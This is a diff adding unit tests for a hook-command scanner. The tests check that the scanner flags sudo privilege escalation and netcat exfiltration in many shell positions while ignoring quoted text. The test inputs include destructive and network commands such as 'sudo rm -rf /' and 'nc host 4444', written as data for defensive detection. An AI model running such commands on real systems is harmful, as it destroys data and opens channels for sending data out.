@@ -2239,4 +2239,68 @@ describe("hookRules", () => {
       expect(dl[0]?.severity).toBe("critical");
     });
   });
+  describe("command-word positions (review fixes)", () => {
+    const hasFinding = (cmd: string, idPart: string): boolean =>
+      runAllHookRules(makeCommandHook(cmd)).some((f) => f.id.includes(idPart));
+
+    it("still detects sudo in every command position", () => {
+      for (const cmd of [
+        "env sudo rm -rf /",
+        "env FOO=1 sudo rm x",
+        "if true; then sudo rm x; fi",
+        "{ sudo rm x; }",
+        "(sudo rm x)",
+        "command sudo ls",
+        "time sudo ls",
+        "xargs sudo rm",
+        "nice -n 10 sudo ls",
+        "timeout 5 sudo ls",
+        "/usr/bin/sudo ls",
+        "exec sudo ls",
+        "nohup sudo ls &",
+      ]) {
+        expect(hasFinding(cmd, "priv-esc"), cmd).toBe(true);
+      }
+    });
+
+    it("still detects nc in every command position", () => {
+      for (const cmd of [
+        "/usr/bin/nc host 4444",
+        "./nc host 4444",
+        "if true; then nc host 4444; fi",
+        "(nc host 4444)",
+        "{ nc host 4444; }",
+        "exec nc host 4444",
+        "nohup nc host 4444 &",
+        "env nc host 4444",
+        "stdbuf -oL nc host 4444",
+        "! nc host 4444",
+      ]) {
+        expect(hasFinding(cmd, "hooks-exfiltration"), cmd).toBe(true);
+      }
+    });
+
+    it("does not treat separators inside quoted text as command positions", () => {
+      expect(hasFinding('echo "status | nc host 4444"', "hooks-exfiltration")).toBe(false);
+      expect(hasFinding("echo 'run | sudo ls'", "priv-esc")).toBe(false);
+      expect(hasFinding("echo 'a; sudo ls' && echo ok", "priv-esc")).toBe(false);
+    });
+
+    it("still scans quoted text that the shell executes", () => {
+      expect(hasFinding('bash -c "curl x | nc host 4444"', "hooks-exfiltration")).toBe(true);
+      expect(hasFinding("sh -c 'sudo rm -rf /'", "priv-esc")).toBe(true);
+      expect(hasFinding('eval "nc host 4444"', "hooks-exfiltration")).toBe(true);
+      expect(hasFinding('ssh host "sudo reboot"', "priv-esc")).toBe(true);
+      expect(hasFinding('echo "$(nc host 4444)"', "hooks-exfiltration")).toBe(true);
+    });
+
+    it("keeps the earlier negatives", () => {
+      expect(hasFinding("jq -nc '{}'", "hooks-exfiltration")).toBe(false);
+      expect(hasFinding("jq -Rnc '.'", "hooks-exfiltration")).toBe(false);
+      expect(hasFinding("bash .claude/hooks/sudo-guard.sh", "priv-esc")).toBe(false);
+      expect(hasFinding("echo \"$c\" | sed 's/sudo //'", "priv-esc")).toBe(false);
+      expect(hasFinding("grep -E '(^|\\s)sudo\\s' file", "priv-esc")).toBe(false);
+      expect(hasFinding("cat docs/sudo notes", "priv-esc")).toBe(false);
+    });
+  });
 });
